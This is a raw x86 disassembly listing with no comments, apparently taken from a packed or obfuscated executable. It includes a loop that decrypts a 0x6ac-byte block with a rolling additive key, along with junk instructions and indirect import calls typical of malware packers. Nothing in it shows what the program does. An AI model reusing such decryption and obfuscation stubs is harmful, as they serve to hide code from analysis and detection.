  4d10e3:	push   DWORD PTR [edi+0x7a239a86]
  4d10e9:	sub    DWORD PTR [esp],0x2
  4d10ed:	mov    edi,0x4d2014
  4d10f2:	pop    DWORD PTR [edi]
  4d10f4:	call   0x4d0750
  4d10f9:	add    esp,0x4
  4d10fc:	push   eax
  4d10fd:	pop    DWORD PTR [ebx+0x17c]
  4d1103:	mov    eax,DWORD PTR [ebx+0x17c]
  4d1109:	mov    eax,eax
  4d110b:	sub    edx,edx
  4d110d:	dec    edx
  4d110e:	and    edx,0x4d0014
  4d1114:	mov    edi,0x7ec7f445
  4d1119:	mov    esi,0x6ac
  4d111e:	cmp    esi,0x0
  4d1121:	je     0x4d113f
  4d1123:	add    esi,0xfffffffc
  4d1126:	xor    ecx,ecx
  4d1128:	push   DWORD PTR [edx+ecx*1]
  4d112b:	add    DWORD PTR [esp],edi
  4d112e:	pop    DWORD PTR [eax+ecx*2]
  4d1131:	dec    DWORD PTR [eax]
  4d1133:	xor    edi,edi
  4d1135:	add    edi,DWORD PTR [edx]
  4d1137:	add    edx,0x4
  4d113a:	add    eax,0x4
  4d113d:	jmp    0x4d111e
  4d113f:	mov    edx,0x0
  4d1144:	push   edx
  4d1145:	call   0x4d0988
  4d114a:	add    esp,0x4
  4d114d:	add    esp,0x54
  4d1150:	pop    ebp
  4d1151:	ret    
  4d1152:	add    BYTE PTR [eax],al
  4d1154:	mov    edi,edi
  4d1156:	push   ebp
  4d1157:	mov    ebp,esp
  4d1159:	sub    esp,0x44
  4d115c:	lea    eax,ds:0x4d3120
  4d1162:	xor    edi,ecx
  4d1164:	push   eax
  4d1165:	mov    esi,0x0
  4d116a:	push   esi
  4d116b:	call   0x4d0988
  4d1170:	add    esp,0x4
  4d1173:	pop    eax
  4d1174:	push   eax
  4d1175:	push   DWORD PTR [eax+0x68]
  4d1178:	push   edi
  4d1179:	call   0x4d13bc
  4d117e:	add    esp,0x8
  4d1181:	pop    eax
  4d1182:	push   eax
  4d1183:	call   0x4d1500
  4d1188:	add    esp,0x4
  4d118b:	pop    eax
  4d118c:	add    esp,0x44
  4d118f:	pop    ebp
  4d1190:	ret    
  4d1191:	add    BYTE PTR [eax],al
  4d1193:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1199:	sub    esp,0x30
  4d119c:	lea    edx,[ebx-0xe4]
  4d11a2:	sbb    ebx,DWORD PTR [ebp-0xc]
  4d11a5:	push   edx
  4d11a6:	push   eax
  4d11a7:	push   DWORD PTR [edx+0x160]
  4d11ad:	push   DWORD PTR [edx+0x1f8]
  4d11b3:	call   0x4d10bc
  4d11b8:	add    esp,0xc
  4d11bb:	pop    edx
  4d11bc:	push   edx
  4d11bd:	mov    esi,0x0
  4d11c2:	push   esi
  4d11c3:	call   0x4d1370
  4d11c8:	add    esp,0x4
  4d11cb:	pop    edx
  4d11cc:	push   edx
  4d11cd:	mov    esi,0x0
  4d11d2:	push   esi
  4d11d3:	call   0x4d0988
  4d11d8:	add    esp,0x4
  4d11db:	pop    edx
  4d11dc:	add    esp,0x30
  4d11df:	pop    ebp
  4d11e0:	ret    
  4d11e1:	add    BYTE PTR [eax],al
  4d11e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11e9:	sub    esp,0x28
  4d11ec:	mov    edx,0x4d3068
  4d11f1:	or     esi,DWORD PTR [edx+0xb0]
  4d11f7:	push   edx
  4d11f8:	push   0x0
  4d11fa:	call   0x4d0cf0
  4d11ff:	add    esp,0x4
  4d1202:	pop    edx
  4d1203:	push   edx
  4d1204:	push   ebx
  4d1205:	push   DWORD PTR [edx+0x18c]
  4d120b:	push   eax
  4d120c:	call   0x4d0c04
  4d1211:	add    esp,0xc
  4d1214:	pop    edx
  4d1215:	push   edx
  4d1216:	mov    ebx,0x0
  4d121b:	push   ebx
  4d121c:	call   0x4d0e64
  4d1221:	add    esp,0x4
  4d1224:	pop    edx
  4d1225:	add    esp,0x28
  4d1228:	pop    ebp
  4d1229:	ret    
  4d122a:	add    BYTE PTR [eax],al
  4d122c:	pop    edi
  4d122d:	call   DWORD PTR ds:0x4d2070
  4d1233:	call   edi
  4d1235:	add    BYTE PTR [eax],al
  4d1237:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d123d:	sub    esp,0x5c
  4d1240:	lea    edx,ds:0x4d31d8
  4d1246:	cmp    edx,0xdcc
  4d124c:	jbe    0x4d123b
  4d124e:	push   edx
  4d124f:	push   DWORD PTR [edx+0x64]
  4d1252:	push   ecx
  4d1253:	push   DWORD PTR [edx+0x13c]
  4d1259:	call   0x4d0b20
  4d125e:	add    esp,0xc
  4d1261:	pop    edx
  4d1262:	push   edx
  4d1263:	push   0x0
  4d1265:	call   0x4d0e64
  4d126a:	add    esp,0x4
  4d126d:	pop    edx
  4d126e:	push   edx
  4d126f:	call   0x4d1500
  4d1274:	add    esp,0x4
  4d1277:	pop    edx
  4d1278:	add    esp,0x5c
  4d127b:	pop    ebp
  4d127c:	ret    
  4d127d:	add    BYTE PTR [eax],al
  4d127f:	add    BYTE PTR [edi-0x1],bl
  4d1282:	adc    eax,0x4d201c
  4d1287:	call   edi
  4d1289:	add    BYTE PTR [eax],al
  4d128b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1291:	sub    esp,0x24
  4d1294:	lea    eax,ds:0x4d316c
  4d129a:	and    DWORD PTR [ebp-0x14],edx
  4d129d:	push   eax
  4d129e:	mov    esi,0x0
  4d12a3:	push   esi
  4d12a4:	call   0x4d1280
  4d12a9:	add    esp,0x4
  4d12ac:	pop    eax
  4d12ad:	push   eax
  4d12ae:	push   DWORD PTR [eax+0x1b4]
  4d12b4:	push   DWORD PTR [eax+0x7c]
  4d12b7:	call   0x4d0c58
  4d12bc:	add    esp,0x8
  4d12bf:	pop    eax
  4d12c0:	push   eax
  4d12c1:	push   0x0
  4d12c3:	call   0x4d075c
  4d12c8:	add    esp,0x4
  4d12cb:	pop    eax
  4d12cc:	add    esp,0x24
  4d12cf:	pop    ebp
  4d12d0:	ret    
  4d12d1:	add    BYTE PTR [eax],al
  4d12d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12d9:	sub    esp,0x3c
  4d12dc:	lea    edx,[edi-0x70]
  4d12df:	sbb    DWORD PTR [edx-0xc8],0x52
  4d12e6:	push   edx
  4d12e7:	push   ecx
  4d12e8:	push   DWORD PTR [edx+0x174]
  4d12ee:	call   0x4d0940
  4d12f3:	add    esp,0x8
  4d12f6:	pop    edx
  4d12f7:	push   edx
  4d12f8:	mov    edx,0x0
  4d12fd:	push   edx
  4d12fe:	call   0x4d0a80
  4d1303:	add    esp,0x4
  4d1306:	pop    edx
  4d1307:	push   edx
  4d1308:	mov    ecx,0x0
  4d130d:	push   ecx
  4d130e:	call   0x4d0894
  4d1313:	add    esp,0x4
  4d1316:	pop    edx
  4d1317:	add    esp,0x3c
  4d131a:	pop    ebp
  4d131b:	ret    
  4d131c:	pop    edi
  4d131d:	call   DWORD PTR ds:0x4d2018
  4d1323:	call   edi
  4d1325:	add    BYTE PTR [eax],al
  4d1327:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d132d:	sub    esp,0x44
  4d1330:	lea    edx,ds:0x4d3034
  4d1336:	sbb    DWORD PTR [edx+0x58],0xffff8613
  4d133d:	push   edx
  4d133e:	push   0x0
  4d1340:	call   0x4d0ec0
  4d1345:	add    esp,0x4
  4d1348:	pop    edx
  4d1349:	push   edx
  4d134a:	push   esi
  4d134b:	push   ebx
  4d134c:	push   DWORD PTR [edx+0x160]
  4d1352:	push   edi
  4d1353:	call   0x4d14ac
  4d1358:	add    esp,0x10
  4d135b:	pop    edx
  4d135c:	push   edx
  4d135d:	push   0x0
  4d135f:	call   0x4d0ecc
  4d1364:	add    esp,0x4
  4d1367:	pop    edx
  4d1368:	add    esp,0x44
  4d136b:	pop    ebp
  4d136c:	ret    
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [edi-0x1],bl
  4d1372:	adc    eax,0x4d200c
  4d1377:	call   edi
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x50
  4d1384:	mov    ebx,0x4d31d8
  4d1389:	sbb    eax,DWORD PTR [ebp-0x38]
  4d138c:	push   0xfffffff4
  4d138e:	call   0x4d0ce4
  4d1393:	add    esp,0x4
  4d1396:	push   ebx
  4d1397:	push   esi
  4d1398:	push   DWORD PTR [ebx+0x140]
  4d139e:	call   0x4d150c
  4d13a3:	add    esp,0x8
  4d13a6:	pop    ebx
  4d13a7:	mov    edx,0x0
  4d13ac:	push   edx
  4d13ad:	call   0x4d0ec0
  4d13b2:	add    esp,0x4
  4d13b5:	add    esp,0x50
  4d13b8:	pop    ebp
  4d13b9:	ret    
  4d13ba:	add    BYTE PTR [eax],al
  4d13bc:	mov    edi,edi
  4d13be:	push   ebp
  4d13bf:	mov    ebp,esp
  4d13c1:	sub    esp,0x20
  4d13c4:	lea    ecx,[eax+0x54]
  4d13c7:	and    DWORD PTR [ebp-0x8],ebx
  4d13ca:	push   ecx
  4d13cb:	push   esi
  4d13cc:	push   DWORD PTR [ecx+0x19c]
  4d13d2:	push   DWORD PTR [ecx+0x148]
  4d13d8:	push   ebx
  4d13d9:	call   0x4d0ca4
  4d13de:	add    esp,0x10
  4d13e1:	pop    ecx
  4d13e2:	push   ecx
  4d13e3:	push   0xfffffff4
  4d13e5:	call   0x4d0ce4
  4d13ea:	add    esp,0x4
  4d13ed:	pop    ecx
  4d13ee:	push   ecx
  4d13ef:	push   0x0
  4d13f1:	call   0x4d1280
  4d13f6:	add    esp,0x4
  4d13f9:	pop    ecx
  4d13fa:	add    esp,0x20
  4d13fd:	pop    ebp
  4d13fe:	ret    
  4d13ff:	add    BYTE PTR [edi-0x1],bl
  4d1402:	adc    eax,0x4d2094
  4d1407:	call   edi
  4d1409:	add    BYTE PTR [eax],al
  4d140b:	add    BYTE PTR [edi-0x1],bl
  4d140e:	adc    eax,0x4d209c
  4d1413:	call   edi
  4d1415:	add    BYTE PTR [eax],al
  4d1417:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d141d:	sub    esp,0x54
  4d1420:	lea    eax,ds:0x4d31d8
  4d1426:	and    edx,0x6761
  4d142c:	push   eax
  4d142d:	push   0x0
  4d142f:	call   0x4d0894
  4d1434:	add    esp,0x4
  4d1437:	pop    eax
  4d1438:	push   eax
  4d1439:	push   edx
  4d143a:	push   edi
  4d143b:	call   0x4d137c
  4d1440:	add    esp,0x8
  4d1443:	pop    eax
  4d1444:	push   eax
  4d1445:	mov    ebx,0x0
  4d144a:	push   ebx
  4d144b:	call   0x4d0e64
  4d1450:	add    esp,0x4
  4d1453:	pop    eax
  4d1454:	add    esp,0x54
  4d1457:	pop    ebp
  4d1458:	ret    
  4d1459:	add    BYTE PTR [eax],al
  4d145b:	add    BYTE PTR [edi-0x1],bl
  4d145e:	adc    eax,0x4d208c
  4d1463:	call   edi
  4d1465:	add    BYTE PTR [eax],al
  4d1467:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d146d:	sub    esp,0x30
  4d1470:	lea    edx,ds:0x4d31e4
  4d1476:	xor    edi,DWORD PTR [edx-0x100]
  4d147c:	push   edx
  4d147d:	push   0x0
  4d147f:	call   0x4d0ec0
  4d1484:	add    esp,0x4
  4d1487:	pop    edx
  4d1488:	push   edx
  4d1489:	push   DWORD PTR [edx+0x8]
  4d148c:	push   ecx
  4d148d:	call   0x4d0ed8
  4d1492:	add    esp,0x8
  4d1495:	pop    edx
  4d1496:	push   edx
  4d1497:	mov    edx,0x0
  4d149c:	push   edx
  4d149d:	call   0x4d0cf0
  4d14a2:	add    esp,0x4
  4d14a5:	pop    edx
  4d14a6:	add    esp,0x30
  4d14a9:	pop    ebp
  4d14aa:	ret    
  4d14ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14b1:	sub    esp,0x1c
  4d14b4:	mov    eax,0x4d305c
  4d14b9:	mov    esi,DWORD PTR [eax+0x30]
  4d14bc:	push   eax
  4d14bd:	lea    ebx,[eax-0x5c]
  4d14c0:	push   ebx
  4d14c1:	call   0x4d0acc
  4d14c6:	add    esp,0x4
  4d14c9:	test   eax,eax
  4d14cb:	jne    0x4d14bd
  4d14cd:	pop    eax
  4d14ce:	push   eax
  4d14cf:	push   DWORD PTR [eax+0x1fc]
  4d14d5:	push   DWORD PTR [eax+0x30]
  4d14d8:	push   DWORD PTR [eax+0xf0]
  4d14de:	call   0x4d0dd0
  4d14e3:	add    esp,0xc
  4d14e6:	pop    eax
  4d14e7:	push   eax
  4d14e8:	lea    ebx,[eax-0x5c]
  4d14eb:	push   ebx
  4d14ec:	call   0x4d0acc
  4d14f1:	add    esp,0x4
  4d14f4:	test   eax,eax
  4d14f6:	jne    0x4d14e8
  4d14f8:	pop    eax
  4d14f9:	add    esp,0x1c
  4d14fc:	pop    ebp
  4d14fd:	ret    
  4d14fe:	add    BYTE PTR [eax],al
  4d1500:	pop    edi
  4d1501:	call   DWORD PTR ds:0x4d2038
  4d1507:	call   edi
  4d1509:	add    BYTE PTR [eax],al
  4d150b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1511:	sub    esp,0x20
  4d1514:	mov    esi,0x4d3194
  4d1519:	mov    DWORD PTR [esi-0x4],0x5da5
  4d1520:	push   esi
  4d1521:	push   eax
  4d1522:	push   edi
  4d1523:	push   ebx
  4d1524:	call   0x4d0fb8
  4d1529:	add    esp,0xc
  4d152c:	pop    esi
  4d152d:	push   0x0
  4d152f:	call   0x4d0988
  4d1534:	add    esp,0x4
  4d1537:	call   0x4d08e8
  4d153c:	add    esp,0x4
  4d153f:	add    esp,0x20
  4d1542:	pop    ebp
  4d1543:	ret    
  4d1544:	mov    edi,edi
  4d1546:	push   ebp
  4d1547:	mov    ebp,esp
  4d1549:	sub    esp,0x44
  4d154c:	lea    eax,[edi+0x9c]
  4d1552:	adc    DWORD PTR [ebp-0x20],edi
  4d1555:	push   eax
  4d1556:	push   DWORD PTR [eax+0x14c]
  4d155c:	push   DWORD PTR [eax+0x5c]
  4d155f:	call   0x4d0b6c
  4d1564:	add    esp,0x8
  4d1567:	pop    eax
  4d1568:	push   eax
  4d1569:	push   0xfffffff4
  4d156b:	call   0x4d0ce4
  4d1570:	add    esp,0x4
  4d1573:	pop    eax
  4d1574:	push   eax
  4d1575:	mov    ebx,0x0
  4d157a:	push   ebx
  4d157b:	call   0x4d0a80
  4d1580:	add    esp,0x4
  4d1583:	pop    eax
  4d1584:	add    esp,0x44
  4d1587:	pop    ebp
  4d1588:	ret    
  4d1589:	add    BYTE PTR [eax],al
  4d158b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1591:	sub    esp,0x20
  4d1594:	mov    edx,0x4d3024
  4d1599:	adc    DWORD PTR [edx+0x17c],0xffffca36
  4d15a3:	push   edx
  4d15a4:	push   ecx
  4d15a5:	push   DWORD PTR [edx+0x98]
  4d15ab:	push   ecx
  4d15ac:	call   0x4d1020
  4d15b1:	add    esp,0xc
  4d15b4:	pop    edx
  4d15b5:	push   edx
  4d15b6:	push   0x0
  4d15b8:	call   0x4d075c
  4d15bd:	add    esp,0x4
  4d15c0:	pop    edx
  4d15c1:	push   edx
  4d15c2:	push   0xfffffff4
  4d15c4:	call   0x4d0ce4
  4d15c9:	add    esp,0x4
  4d15cc:	pop    edx
  4d15cd:	add    esp,0x20
  4d15d0:	pop    ebp
  4d15d1:	ret    
  4d15d2:	add    BYTE PTR [eax],al
  4d15d4:	pop    edi
  4d15d5:	call   DWORD PTR ds:0x4d2058
  4d15db:	call   edi
  4d15dd:	add    BYTE PTR [eax],al
	...
